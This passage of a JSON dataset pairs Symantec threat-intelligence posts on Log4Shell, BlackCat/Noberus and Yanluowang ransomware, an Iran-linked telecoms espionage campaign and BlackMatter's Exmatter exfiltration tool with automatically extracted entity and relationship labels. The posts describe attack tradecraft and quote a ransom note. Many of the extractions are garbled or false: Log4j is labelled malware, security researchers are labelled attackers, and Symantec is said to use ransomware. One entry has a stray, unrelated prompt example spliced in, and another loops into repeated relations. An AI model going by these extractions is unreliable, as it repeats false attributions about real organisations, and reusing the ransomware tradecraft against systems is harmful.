Log4Shell related exploitation attempts on more than 270,000 unique machines. During the same time frame, IPS blocked more than 18 million Log4Shell related exploitation attempts on more than 60,000 unique server machines. The majority of Log4Shell attacks blocked by Symantec were against machines located in the U.S. and the United Kingdom, followed by Singapore, India, and Australia. Meanwhile, the majority of attacks exploiting the Log4j vulnerabilities seem to originate from devices located in the U.S. and Germany, followed by Russia, the United Kingdom, and China. Machine learning-based DCS provides multi-layered protection for Windows, Linux Server workloads, and container applications for this vulnerability: Siddhesh works for the Intrusion Prevention System (IPS) team in Symantec's Security Technology and Response (STAR) division. He analyzes and creates IPS protection for various network-based threats such as exploit kits and tech support scams. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (Apache Log4j, Tool), (Log4j, Malware), (CVE-2021-44228, Vulnerability), (CVE-2021-45046, Vulnerability), (CVE-2021-45105, Vulnerability), (Muhstik Botnet, Threat Type), (LDAP, Protocol), (RMI, Protocol), (ELF, File), (Figure 1, File)\\nRelationships: (Apache Log4j, contains, Log4j), (Log4j, uses, CVE-2021-44228), (Log4j, uses, CVE-2021-45046), (Log4j, uses, CVE-2021-45105), (Muhstik Botnet, uses, Log4shell), (LDAP, connectsTo, Log4j), (RMI, connectsTo, Log4j), (ELF, containedIn, Figure 1) Example 6:\nInput: The latest version of Windows Defender Antivirus has detected a new type of malware called \"Worm\" that spreads through email attachments. This worm is known to encrypt victim's files and demand payment in Bitcoin for decryption keys. It is believed to be developed by Lazarus Group, an APT group operating out of North Korea. The malware",
      "entities": [
        [
          "Apache Log4j",
          "Tool"
        ],
        [
          "Log4j",
          "Malware"
        ],
        [
          "CVE-2021-44228",
          "Vulnerability"
        ],
        [
          "CVE-2021-45046",
          "Vulnerability"
        ],
        [
          "CVE-2021-45105",
          "Vulnerability"
        ],
        [
          "Muhstik Botnet",
          "Threat Type"
        ],
        [
          "LDAP",
          "Protocol"
        ],
        [
          "RMI",
          "Protocol"
        ],
        [
          "ELF",
          "File"
        ],
        [
          "Figure 1",
          "File"
        ],
        [
          "Apache Log4j",
          "contains",
          "Log4j"
        ],
        [
          "Log4j",
          "uses",
          "CVE-2021-44228"
        ],
        [
          "Log4j",
          "uses",
          "CVE-2021-45046"
        ],
        [
          "Log4j",
          "uses",
          "CVE-2021-45105"
        ],
        [
          "Muhstik Botnet",
          "uses",
          "Log4shell"
        ],
        [
          "LDAP",
          "connectsTo",
          "Log4j"
        ],
        [
          "RMI",
          "connectsTo",
          "Log4j"
        ],
        [
          "ELF",
          "containedIn",
          "Figure 1"
        ]
      ],
      "relationships": [],
      "has_entities": true
    },
    "entity_count": 18,
    "relationship_count": 0
  },
  {
    "title": "noberus blackcat alphv rust ransomware",
    "link": "https://www.security.com/threat-intelligence/noberus-blackcat-alphv-rust-ransomware",
    "content": "Symantec’s Threat Hunter Team has additional technical information to share on the new ALPHV/BlackCat ransomware that was first published about last week, and which we have been tracking for several weeks. Symantec, a division ofBroadcom Software, tracks this ransomware as Ransom.Noberus and our researchers first spotted it on a victim organization on November 18, 2021, with three variants of Noberus deployed by the attackers over the course of that attack. This would appear to show that this ransomware was active earlier than was previously reported, withMalwareHunterTeam having toldBleepingComputerthey first saw this ransomware on November 21. Noberus is an interesting ransomware because it is coded in Rust, and this is the first time we have seen a professional ransomware strain that has been used in real-world attacks coded in this programming language. Noberus appears to carry out the now-typical double extortion ransomware attacks where they first steal information from victim networks before encrypting files. Noberus adds the .sykffle extension to encrypted files. This blog contains information about the attack chain we observed in one victim organization, as well as technical details about the operation of this ransomware. The first suspicious activity observed by Symantec occurred on a victim’s network on November 3, approximately two weeks before Noberus was deployed. During this time, suspicious network activity was observed. Later on November 18, shortly before Noberus was deployed, ConnectWise was also executed. A few hours later, Noberus was deployed, indicating that the attackers may have leveraged access to ConnectWise to deploy their payload. While it is a legitimate tool, ConnectWise has frequentlybeen exploited by ransomware attackers in recent timesto gain access to victim networks. On November 3, suspicious Server Message Block (SMB) requests occurred on the earliest machine to get infected on the victim network. This was followed by remote Local Security Authority (LSA) registry dump attempts from a remote machine on the network. This suggests the attackers may have compromised another machine on the network where we didn't have visibility, or they could also have added a new machine to the domain from which they were launching attacks to dump credentials. On the same day, PsExec was also executed from a remote machine to launch a command prompt. The attackers used this to disable a restricted remote administration feature known as ‘RestrictedAdmin mode’ via the Windows registry. This effectively disables safeguards guarding against 'pass the hash' attacks targeting Remote Desktop Protocol (RDP), allowing the attackers to attempt to gain higher administrative privileges. The next activity occurred on November 18 when PsExec was used to run multiple PowerShell commands to effectively disable Windows Defender. Specifically, the PowerShell command used added *.exe to an exclusion list for AV scanning, and this command was executed across the entire organization. Later on November 18, the first instance of Noberus ransomware was deployed via PsExec. In order for Noberus to execute properly, it requires a specific ‘access-token’. This acts as a unique key, which is used to distinguish the victim when visiting the Noberus operators’ Tor site. The following similar commands were observed being executed: In the above, PsExec is launched with the following specific command line arguments: For the second command above, the ‘no-net’ command line argument instructs Noberus not to process network shares during propagation. See the Technical Details below for a full list of support command line arguments and their description. In all the samples of Noberus that we have access to, the victim’s administrative credentials are embedded as part of the configuration block, showing that this attack was specifically targeted at this victim. Once Noberus is executed, the ransomware first deletes any available shadow copies, which is typical in ransomware attacks, in order to stop the organization from restoring encrypted files. Noberus then runs commands to collect system information via WMIC, in order to collect Universally Unique Identifiers (UUIDs) from each machine. These are then used to generate the ‘access token’ that makes up part of the unique Tor address victims are instructed to visit. We also saw a fsutil command being executed by Noberus. Fsutil performs tasks that are related to file allocation table (FAT) and NTFS file systems. In this incident, the attacker is specifically modifying the SymLink Evaluation behavior to modify the type of symbolic links that can be created on the system. Symbolic links create a file in your directory that acts as a shortcut to another file or folder. This is used to follow various types of shortcuts (local and remote), likely to ensure Noberus can follow these shortcuts and perform encryption. As part of the propagation mechanism, Noberus attempts to mount hidden partitions. It then attempts to spread via the ‘net use’ command. The embedded administrative credentials are used as part of this mechanism along with PsExec, which is embedded in a compressed form within Noberus. During the attack, the attackers were also seen modifying the maximum limit of concurrent requests machines could make via PsExec. This was likely to aid in the propagation of Noberus across the network. At this stage, Noberus proceeds to terminate a set of pre-defined processes and begin the encryption process. At some point during the attack the organization became aware of the infection and deployed remediation software. However, despite this, it appears the attackers were able to return and deploy another variant of their ransomware to other systems on the network. In total, three variants of this ransomware were identified during this intrusion, leading to at least 261 machines on the network becoming infected with Noberus. A technical analysis of Noberus itself found that a lot of its behavior is consistent with the activity we saw on the victim network. The first step it takes after being deployed on victim networks is to remove shadow copies: It then issues a command to collect Universally Unique Identifiers (UUIDs) from infected machines. The UUID and parameter ‘access token’ are then used to generate \"ACCESS_KEY\". Noberus then enables the remote-to-local and remote-to-remote symbolic link evaluations. It then attempts to mount a hidden partition, by issuing the following commands: Noberus then cleans up the Recycle Bin and attempts to propagate via network share. It looks for available shares by using the ‘net use’ command or NetShareEnum function. Embedded administrative credentials may then be used for propagation via network share. Noberus also attempts to propagate via PsExec. The PsExec module is embedded in the Noberus code (see Figure 1). It is compressed with zlib (Figure 2). The decompressed PsExec file is a legitimate Microsoft-signed clean file (Figure 3). Once it has gained access to a machine, Noberus then proceeds to kill the following processes and services: It also excludes certain directories, filenames, and file extensions from the encryption process, such as: Noberus then proceeds to encrypt files using either AES or ChaCha20 encryption. The private key for encrypted machines appears to be generated randomly. It appears that Noberus generates a random number using BCryptGenRandom and calculates each byte with the string shown inFigure 4. Files that have been encrypted have .sykffle appended to the end of their filename, in the following format: Noberus then creates a ransomware note, creating a .txt and a .png file that are displayed to victims, with the following filenames: The text file tells victims the following: Important files on your system was ENCRYPTED and now they have \"sykffle\" extension. In order to recover your files you need to follow instructions below. Sensitive data on your system was DOWNLOADED and it will be PUBLISHED if you refuse to cooperate. - Employees personal data, CVs, DL, SSN. - Complete network map including credentials for local and remote services. - Financial information including clients’ data, bills, budgets, annual reports, bank statements. - Complete datagrams/schemas/drawings for manufacturing in solidworks format Private preview is published here: http://zujgzbu5y64xbmvc42addp4lxkoosb4tslf5mehnh7pvqjpwxn5gokyd[.]onion/[REDACTED] DO NOT MODIFY FILES YOURSELF. DO NOT USE THIRD PARTY SOFTWARE TO RESTORE YOUR DATA. YOU MAY DAMAGE YOUR FILES, IT WILL RESULT IN PERMANENT DATA LOSS. YOUR DATA IS STRONGLY ENCRYPTED, YOU CAN NOT DECRYPT IT WITHOUT CIPHER KEY. >> Recovery procedure Follow these simple steps to get in touch and recover your data: 1) Download and install Tor Browser from: https://torproject.org/ 2) Navigate to: http://mu75ltv3lxd24dbyu6gtvmnwybecigs5auki7fces437xvvflzva2nqd[.]onion/?access-key=[REDACTED] This is a sophisticated new ransomware with no apparent weaknesses in its encryption process, meaning unless victims have comprehensive backups they will be obliged to pay the ransom to recover their files. The fact it is written in Rust is interesting, as while Rust is not typically seen being used by malware developers, it is growing in popularity and it shows that ransomware developers too are not afraid to innovate in this area. While the reported number of victims of this ransomware so far appears to be small, the sophistication of Noberus itself and the level of determination shown by the attackers in the attack we did observe indicates it is likely we will see more of this ransomware in the future. It is also reported that the developers behind this ransomware are actively seeking affiliates on Russian-speaking hacking forums, meaning the number of malicious actors deploying this ransomware is likely to grow. For the latest protection updates, please visit theSymantec Protection Bulletin. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (Symantec, Company), (Threat Hunter Team, Attacker), (ALPHV/BlackCat ransomware, Malware), (Ransom.Noberus, Malware), (MalwareHunterTeam, Attacker), (November 18, Date), (November 21, Date)\nRelationships: (Symantec, tracks, Ransom.Noberus), (Symantec, uses, ALPHV/BlackCat ransomware), (Symantec, reports, ALPHV/BlackCat ransomware), (Symantec, discovered, Ransom.Noberus), (Symantec, discovers, ALPHV/BlackCat ransomware), (Symantec, first spotted, Ransom.Noberus), (Symantec, first spotted, ALPHV/BlackCat ransomware)",
      "entities": [
        [
          "Symantec",
          "Company"
        ],
        [
          "Threat Hunter Team",
          "Attacker"
        ],
        [
          "ALPHV/BlackCat ransomware",
          "Malware"
        ],
        [
          "Ransom.Noberus",
          "Malware"
        ],
        [
          "MalwareHunterTeam",
          "Attacker"
        ],
        [
          "November 18",
          "Date"
        ],
        [
          "November 21",
          "Date"
        ]
      ],
      "relationships": [
        [
          "Symantec",
          "tracks",
          "Ransom.Noberus"
        ],
        [
          "Symantec",
          "uses",
          "ALPHV/BlackCat ransomware"
        ],
        [
          "Symantec",
          "reports",
          "ALPHV/BlackCat ransomware"
        ],
        [
          "Symantec",
          "discovered",
          "Ransom.Noberus"
        ],
        [
          "Symantec",
          "discovers",
          "ALPHV/BlackCat ransomware"
        ],
        [
          "Symantec",
          "first spotted",
          "Ransom.Noberus"
        ],
        [
          "Symantec",
          "first spotted",
          "ALPHV/BlackCat ransomware"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 7,
    "relationship_count": 7
  },
  {
    "title": "espionage campaign telecoms asia middle east",
    "link": "https://www.security.com/threat-intelligence/espionage-campaign-telecoms-asia-middle-east",
    "content": "Attackers most likely linked to Iran have attacked a string of telecoms operators in the Middle East and Asia over the past six months, in addition to a number of IT services organizations and a utility company. Organizations in Israel, Jordan, Kuwait, Saudi Arabia, the United Arab Emirates, Pakistan, Thailand, and Laos were targeted in the campaign, which appears to have made no use of custom malware and instead relied on a mixture of legitimate tools, publicly available malware, and living-off-the-land tactics. While the identity of the attackers remains unconfirmed, there is some evidence to suggest a link to the Iranian Seedworm (aka MuddyWater) group.  The targeting and tactics are consistent with Iranian-sponsored actors. After breaching a targeted network, the attackers typically attempt to steal credentials and move laterally across the network. They appear to be particularly interested in Exchange Servers, deploying web shells onto them. In some cases, the attackers may be using compromised organizations as stepping stones to additional victims. Furthermore, some targets may have been compromised solely to perform supply-chain-type attacks on other organizations. In most attacks, the infection vector is unknown. Evidence of a possible vector was found at only one target. A suspected ScreenConnect setup MSI appeared to have been delivered in a zipped file named “Special discount program.zip”, suggesting that it arrived in a spear-phishing email. In one attack against a telecoms firm in the Middle East, which began in August 2021, the first evidence of compromise was the creation of a service to launch an unknown Windows Script File (WSF). Scripts were then used to issue various domain, user discovery, and remote service discovery commands. The attackers used PowerShell to download another WSF and run it. Net group was used to query for the “exchange trusted subsystem” domain group. The attackers used Certutil to download a suspected Ligolo tunneling tool and launch WMI, which was used to get remote machines to carry out the following tasks: Based on process lineage data, attackers seemed to use scripts extensively. These may be automated scripts used for collecting information and downloading additional tools. However, in one instance, a command asks cURL for help, suggesting that there may have been at least some hands-on-keyboard activity on the part of the attackers. The attackers then used a remote access tool, believed to be eHorus, to perform the following tasks: One feature of this attack against a telecoms organization is that the attackers may have attempted to pivot to other targets by connecting to the Exchange Web Services (EWS) of other organizations, another telecoms operator, and an electronic equipment company in the same region. The following commands were used: It is unclear what the intent of these requests is. It is possible the attackers were attempting to check connectivity to these organizations. One target that appeared to be an outlier was a utility company in Laos. The infection vector may have been the exploit of a public-facing service since the first machine that appeared to be compromised was an IIS web server. Suspicious activity also had w3wp.exe in the process lineage. The attackers then used PowerShell to: The attackers then used PowerShell to connect to a webmail server of an organization in Thailand. They also attempted to connect to IT-related servers belonging to another company in Thailand. To facilitate credential theft, WMI was used to execute PowerShell to modify the registry to store passwords in plaintext in memory. In addition to this, an obfuscated version of the publicly available CrackMapExec tool appeared to be deployed. The attackers made heavy use of legitimate tools and publicly available hacking tools. These include: There is some evidence to suggest that the Iranian Seedworm group was responsible for these attacks. Two IP addresses used in this campaign have been previously linked to Seedworm activity. However, Seedworm is known to regularly switch its infrastructure, meaning conclusive attribution cannot be made. There is also some overlap in tools between this campaign and earlier Seedworm campaigns. ScreenConnect, RemoteUtilities, SharpChisel, Ligolo, ProcDump, and Password Dumper were all referenced by Trend Micro in aMarch 2021 blog on Seedworm activity. In the case of two tools – SharpChisel and Password Dumper – identical versions were used in this campaign to those that were documented by Trend. If these attacks are linked to Iran, it will not be the first time an Iranian threat actor has targeted the telecoms sector.In 2018, Symantec revealedthat the Chafer group had compromised of a major telecoms services provider in the Middle East. While the ultimate end goal of the campaign remains unknown, the focus on telecoms operators suggests that the attackers are gathering intelligence on the sector and possibly attempting to pivot into spying on communications. For the latest protection updates, please visit theSymantec Protection Bulletin. ae5d0ad47328b85e4876706c95d785a3c1387a11f9336844c39e75c7504ba365 – Ligolo e0873e15c7fb848c1be8dc742481b40f9887f8152469908c9d65930e0641aa6b – Ligolo 22e7528e56dffaa26cfe722994655686c90824b13eb51184abfe44d4e95d473f – Hidec b0b97c630c153bde90ffeefc4ab79e76aaf2f4fd73b8a242db56cc27920c5a27 – Nping b15dcb62dee1a8499b8ac63064a282a06abf0f7d0302c5e356cdb0c7b78415a9 – LSASS Dumper 61f83466b512eb12fc82441259a5205f076254546a7726a2e3e983011898e4e2 – SharpChisel ccdddd1ebf3c5de2e68b4dcb8fbc7d4ed32e8f39f6fdf71ac022a7b4d0aa4131 – Password Dumper facb00c8dc1b7ed209507d7c56d18b2c542c4e0b2986b9bfaf1764d8e252576b – CrackMapExec 1a107c3ece1880cbbdc0a6c0817624b0dd033b02ebaf7fa366306aaca22c103d – ProcDump 916cc8d6bf2282ae0d2db587f4f96780af59e685a1f1a511e0b2b276669dc802 – ProcDump e2a7a9a803c6a4d2d503bb78a73cd9951e901beb5fb450a2821eaf740fc48496 – ProcDump f6600e5d5c91ed30d8203ef2bd173ed0bc431453a31c03bc363b89f77e50d4c5 - SOCKS5 proxy server 6d73c0bcdf1274aeb13e5ba85ab83ec00345d3b7f3bb861d1585be1f6ccda0c5 – Keylogger 912018ab3c6b16b39ee84f17745ff0c80a33cee241013ec35d0281e40c0658d9 – Mimikatz 96632f716df30af567da00d3624e245d162d0a05ac4b4e7cbadf63f04ca8d3da – Mimikatz bee3d0ac0967389571ea8e3a8c0502306b3dbf009e8155f00a2829417ac079fc – Mimikatz d9770865ea739a8f1702a2651538f4f4de2d92888d188d8ace2c79936f9c2688 - Mimikatz The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (Iranian Seedworm, Attacker), (ScreenConnect, Tool), (Special discount program.zip, File), (zipped file, File), (Spear-phishing, Technique), (Exchange Server, Vulnerable Target), (Supply-chain type attack, Threat Type)\nRelationships: (Iranian Seedworm, linkedTo, ScreenConnect), (Iranian Seedworm, linkedTo, Special discount program.zip), (Iranian Seedworm, linkedTo, Exchange Server), (Iranian Seedworm, linkedTo, Supply-chain type attack)",
      "entities": [
        [
          "Iranian Seedworm",
          "Attacker"
        ],
        [
          "ScreenConnect",
          "Tool"
        ],
        [
          "Special discount program.zip",
          "File"
        ],
        [
          "zipped file",
          "File"
        ],
        [
          "Spear-phishing",
          "Technique"
        ],
        [
          "Exchange Server",
          "Vulnerable Target"
        ],
        [
          "Supply-chain type attack",
          "Threat Type"
        ]
      ],
      "relationships": [
        [
          "Iranian Seedworm",
          "linkedTo",
          "ScreenConnect"
        ],
        [
          "Iranian Seedworm",
          "linkedTo",
          "Special discount program.zip"
        ],
        [
          "Iranian Seedworm",
          "linkedTo",
          "Exchange Server"
        ],
        [
          "Iranian Seedworm",
          "linkedTo",
          "Supply-chain type attack"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 7,
    "relationship_count": 4
  },
  {
    "title": "apache log4j zero day",
    "link": "https://www.security.com/threat-intelligence/apache-log4j-zero-day",
    "content": "UPDATE December 20, 2021:The Apache Software Foundation has released a patch for a third vulnerability in Log4j. Version 2.17.0 of the software was released on December 17 after issues were discovered with the previous release (2.16). Apache said that 2.16 does not always protect from infinite recursion in lookup evaluation and is vulnerable to CVE-2021-45105, a denial of service vulnerability. UPDATE December 15, 2021:Apache has patched a second vulnerability in Log4j. The vulnerability (CVE-2021-45046) arises from the fact that the fix for the previous vulnerability (CVE-2021-44228) did not completely prevent exploits in all circumstances. According to Apache, the vulnerability occurs in certain non-default configurations. It could permit attackers to “craft malicious input data using a JNDI Lookup pattern resulting in a denial of service (DOS) attack”. A zero-day vulnerability (CVE-2021-44228) has been discovered in Apache Log4j which, if exploited, could permit a remote attacker to execute arbitrary code on vulnerable systems. Exploit code for this vulnerability, dubbed Log4Shell, has been shared publicly and multiple attackers are already attempting to exploit it. Q: Will Symantec protect against exploit attempts? A:Yes, Symantec products will guard against exploit attempts and payloads with the following detections: Machine learning-based Symantec Data Center Securityprovides a range of protection for server workloads against this vulnerability: Q: What is the significance of this vulnerability? A:Apache Log4j is a java-based logging utility. It is widely used in cloud and enterprise software services. The fact that an exploit was discovered prior to the creation of a patch only heightens the severity of the threat. Q: Has the vulnerability been patched? A:Yes, users areadvised to update to version 2.15.0 immediately. Apache has also provided mitigation advice for users of earlier versions. Q: Is this vulnerability being exploited in the wild? A:Yes. Exploit code is publicly available and there are multiple reports of exploit attempts. To date, activity appears to be mainly centered on coin mining botnets but it is only a matter of time before attackers of all types attempt to leverage this exploit. For the latest protection updates, please visit theSymantec Protection Bulletin. 1.Broadcom Response to Log4j Vulnerability 2.Symantec Security Advisory The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "No related entities and relations",
      "entities": [],
      "relationships": [],
      "has_entities": false
    },
    "entity_count": 0,
    "relationship_count": 0
  },
  {
    "title": "yanluowang ransomware attacks continue",
    "link": "https://www.security.com/threat-intelligence/yanluowang-ransomware-attacks-continue",
    "content": "Yanluowang, the ransomware recentlydiscovered by Symantec, a division ofBroadcom Software, is now being used by a threat actor that has been mounting targeted attacks against U.S. corporations since at least August 2021. The attacker uses a number of tools, tactics, and procedures (TTPs) that were previously linked to Thieflock ransomware attacks, suggesting that they may have been a Thieflock affiliate who shifted allegiances to the new Yanluowang ransomware family. The attackers have been heavily focused on organizations in the financial sector but have also targeted companies in the manufacturing, IT services, consultancy, and engineering sectors. In most cases, PowerShell is used to download tools to compromised systems including BazarLoader to assist in reconnaissance. The attackers then enable RDP via registry to enable remote access. After gaining initial access, the attackers usually deploy ConnectWise (formerly known as ScreenConnect), a legitimate remote access tool. In order to perform lateral movement and identify systems of interest, such as the victim’s Active Directory server, the attackers deploy Adfind, a free tool that can be used to query Active Directory, and SoftPerfect Network Scanner (netscan.exe), a publicly available tool used for discovery of hostnames and network services. The next phase of the attack is credential theft and the attackers use a wide range of credential-stealing tools, including: Along with these tools, the attackers also use a number of open-source tools such as KeeThief, a PowerShell script to copy the master key from KeePass. In some cases, customized versions of open-source credential-dumping tools were also observed (secretsdump.exe). Credentials were also dumped from the registry. In addition, the attackers have also used a number of other data capture tools, including a screen capture tool and a file exfiltration tool (filegrab.exe). Cobalt Strike Beacon was also deployed against at least one targeted organization. Other tools used include ProxifierPE, which can be used to proxy connections back to attacker-controlled infrastructure, and the free, Chromium-based Cent web browser. There is a tentative link between these Yanluowang attacks and older attacks involving Thieflock, ransomware-as-a-service developed by the Canthroid (aka Fivehands) group. Several TTPs used by these attackers overlap with TTPs used in Thieflock attacks, including: This link begs the question of whether Yanluowang was developed by Canthroid. However, analysis of Yanluowang and Thieflock does not provide any evidence of shared authorship. Instead, the most likely hypothesis is that these Yanluowang attacks may be carried out by a former Thieflock affiliate. For the latest protection updates, please visit theSymantec Protection Bulletin. a710f573f73c163d54c95b4175706329db3ed89cd9337c583d0bb24b6a384789 – NetScan 2c2513e17a23676495f793584d7165900130ed4e8cccf72d9d20078e27770e04 – Adfind 43f8a66d3f3f1ba574bc932a7bc8e5886fbeeab0b279d1dea654d7119e80a494 – BazarLoader 9aa1f37517458d635eae4f9b43cb4770880ea0ee171e7e4ad155bbdee0cbe732 – Veeamp 85fb8a930fa7f4c32c8af86aa204eb4ea4ae404e670a8be17e7ae0adf37a9e2e – GrabFF e4942fde1cd7f2fcfb522090fd16298bce247295fe99182aecf7b10be3f5dc53 – ConnectwiseInstaller fe38912d64f6d196ac70673cd2edbdbc1a63e494a2d7903546a6d3afa39dc5c4 – WmiExecAgent c77ff8e3804414618abeae394d3003c4bb65a43d69c57c295f443aeb14eaa447 – NetScan 2fc5bf9edcfa19d48e235315e8f571638c99a1220be867e24f3965328fe94a03 – Secretsdump 4ff503258e23d609e0484ee5df70a1db080875272ab6b4db31463d93ebc3c6dd – GrabFile 1c543ea5c50ef8b0b42f835970fa5f553c2ae5c308d2692b51fb476173653cb3 – GrabChrome 0b9219328ebf065db9b26c9a189d72c7d0d9c39eb35e9fd2a5fefa54a7f853e4 – OpenChromeDumps b556d90b30f217d5ef20ebe3f15cce6382c4199e900b5ad2262a751909da1b34 – BrowserPassView 5e03cea2e3b875fdbf1c142b269470a9e728bcfba1f13f4644dcc06d10de8fb4 – ConHost 49d828087ca77abc8d3ac2e4719719ca48578b265bbb632a1a7a36560ec47f2d – Yanluowang The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (Yanluowang, Malware), (Thieflock, Attacker), (Thieflock ransomware, Threat Type), (BazarLoader, Tool), (Adfind, Tool), (SoftPerfect Network Scanner, Tool), (Credential Stealer, Tool)\nRelationships: (Yanluowang, uses, Credential Stealer), (Thieflock, associatedWith, Yanluowang), (Thieflock, uses, BazarLoader), (Thieflock, uses, Adfind), (Thieflock, uses, SoftPerfect Network Scanner), (Thieflock, uses, ConnectWise), (Thieflock, uses, PowerShell), (Thieflock, uses, RDP), (Thieflock, uses, Adfind), (Thieflock, uses, netscan.exe), (Thieflock, uses, Credential Stealer), (Thieflock, uses, ConnectWise), (Thieflock, uses, Credential Stealer), (Thieflock, uses, Credential Stealer), (Thieflock, uses, Credential Stealer), (Thieflock, uses, Credential Stealer), (Thieflock, uses, Credential Stealer), (Thieflock, uses, Credential Stealer), (Thieflock, uses, Credential Stealer), (Thieflock, uses, Credential Stealer), (Thieflock, uses, Credential Stealer), (Thieflock, uses,",
      "entities": [
        [
          "Yanluowang",
          "Malware"
        ],
        [
          "Thieflock",
          "Attacker"
        ],
        [
          "Thieflock ransomware",
          "Threat Type"
        ],
        [
          "BazarLoader",
          "Tool"
        ],
        [
          "Adfind",
          "Tool"
        ],
        [
          "SoftPerfect Network Scanner",
          "Tool"
        ],
        [
          "Credential Stealer",
          "Tool"
        ]
      ],
      "relationships": [
        [
          "Yanluowang",
          "uses",
          "Credential Stealer"
        ],
        [
          "Thieflock",
          "associatedWith",
          "Yanluowang"
        ],
        [
          "Thieflock",
          "uses",
          "BazarLoader"
        ],
        [
          "Thieflock",
          "uses",
          "Adfind"
        ],
        [
          "Thieflock",
          "uses",
          "SoftPerfect Network Scanner"
        ],
        [
          "Thieflock",
          "uses",
          "ConnectWise"
        ],
        [
          "Thieflock",
          "uses",
          "PowerShell"
        ],
        [
          "Thieflock",
          "uses",
          "RDP"
        ],
        [
          "Thieflock",
          "uses",
          "Adfind"
        ],
        [
          "Thieflock",
          "uses",
          "netscan.exe"
        ],
        [
          "Thieflock",
          "uses",
          "Credential Stealer"
        ],
        [
          "Thieflock",
          "uses",
          "ConnectWise"
        ],
        [
          "Thieflock",
          "uses",
          "Credential Stealer"
        ],
        [
          "Thieflock",
          "uses",
          "Credential Stealer"
        ],
        [
          "Thieflock",
          "uses",
          "Credential Stealer"
        ],
        [
          "Thieflock",
          "uses",
          "Credential Stealer"
        ],
        [
          "Thieflock",
          "uses",
          "Credential Stealer"
        ],
        [
          "Thieflock",
          "uses",
          "Credential Stealer"
        ],
        [
          "Thieflock",
          "uses",
          "Credential Stealer"
        ],
        [
          "Thieflock",
          "uses",
          "Credential Stealer"
        ],
        [
          "Thieflock",
          "uses",
          "Credential Stealer"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 7,
    "relationship_count": 21
  },
  {
    "title": "blackmatter data exfiltration",
    "link": "https://www.security.com/threat-intelligence/blackmatter-data-exfiltration",
    "content": "At least one affiliate of the BlackMatter ransomware operation has begun using a custom data exfiltration tool in its attacks. Exmatter, which was discovered by Symantec’s Threat Hunter Team, is designed to steal specific file types from a number of selected directories and upload them to an attacker-controlled server prior to deployment of the ransomware itself on the victim’s network. This is the third time a custom data exfiltration tool appears to have been developed by ransomware operators, following the earlier discovery of the Ryuk Stealer tool and StealBit, which is linked to the LockBit ransomware operation. Exmatter is compiled as a .NET executable and obfuscated. When run, it checks its command line arguments for the following strings: \"nownd\" and \"-nownd\". If either is found, it attempts to hide its own window by calling the \"ShowWindow\" API as follows: In order to identify files for exfiltration, it will retrieve the drive names of all logical drives on the infected computer and collect all file path names, disregarding anything under the following directories: It will also exclude files of less than 1,024 bytes in size and files with the following attributes: It will only exfiltrate files with the following extensions: It attempts to prioritize files for exfiltration by using LastWriteTime. Files that match the criteria are then uploaded to a remote SFTP server using the following parameters: Exmatter also includes SOCKS5 configuration, but this is not used: When it has finished exfiltrating data, Exmatter starts the following process to remove any trace of itself: This will attempt to overwrite an initial chunk of the file before deleting it. Multiple variants of Exmatter have been found, suggesting that the attackers have continued to refine the tool in order to expedite exfiltration of a sufficient volume of high value data in as short a time as possible. In a second variant, the directory “C:\\Program Files\\Windows Defender Advanced Threat Protection\\Classification\\Configuration” has been replaced with “C:\\Program Files\\Windows Defender Advanced Threat Protection\" on the exclusion list. The file types “.xlsm”, and “.zip” were added to the inclusion list. A third version of note added a WebDav client. The code structure suggests that SFTP remains the first choice protocol, with WebDav acting as a backup. The WebDav client uses the following URL: The following file types were also added to the inclusion list: In addition to this, Exmatter is configured to skip exfiltration for files with names containing any of the following strings: A fourth variant contained updated SFTP server details: The WebDav client used the following updated URL: Finally, the list of files for inclusion was updated by removing “.png”. BlackMatter is linked to the Coreid cyber crime group, which was previously responsible for the Darkside ransomware. For the past 12 months, it has been one of the most prolific targeted ransomware operators and its tools have been used in a number of ambitious attacks, most notably the May 2021 Darkside attack on Colonial Pipeline that disrupted fuel supplies to the East Coast of the U.S. Coreid operates under a RaaS model, working with affiliates to conduct ransomware attacks and then taking a share of the profits. Like most ransomware actors, attacks linked to Coreid steal victims’ data and the group then threatens to publish it to further pressure victims into paying the ransom demand. Whether Exmatter is the creation of Coreid itself or one of its affiliates remains to be seen, but its development suggests that data theft and extortion continues to be a core focus of the group. For the latest protection updates, please visit theSymantec Protection Bulletin. 325ecd90ce19dd8d184ffe7dfb01b0dd02a77e9eabcb587f3738bcfbd3f832a1 5e355f90b398cbb54829038c6e5d68e8c578405d142bdcc2386cf6161c8d7014 8eded48c166f50be5ac33be4b010b09f911ffc155a3ab76821e4febd369d17ef b6bc126526e27c98a94aab16989864161db1b3a75f18bd5c72bacbdfccad7bd7 fcaed9faa026a26d00731068e956be39235487f63e0555b71019d16a59ea7e6b The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (BlackMatter, Threat Type), (Exmatter, Tool), (StealBit, Tool), (LockBit, Attacker), (Ryuk Stealer, Tool)\nRelationships: (BlackMatter, uses, Exmatter), (BlackMatter, uses, Ryuk Stealer), (BlackMatter, uses, StealBit)",
      "entities": [
        [
          "BlackMatter",
          "Threat Type"
        ],
        [
          "Exmatter",
          "Tool"
        ],
        [
          "StealBit",
          "Tool"
        ],
        [
          "LockBit",
          "Attacker"
        ],
        [
          "Ryuk Stealer",
          "Tool"
        ]
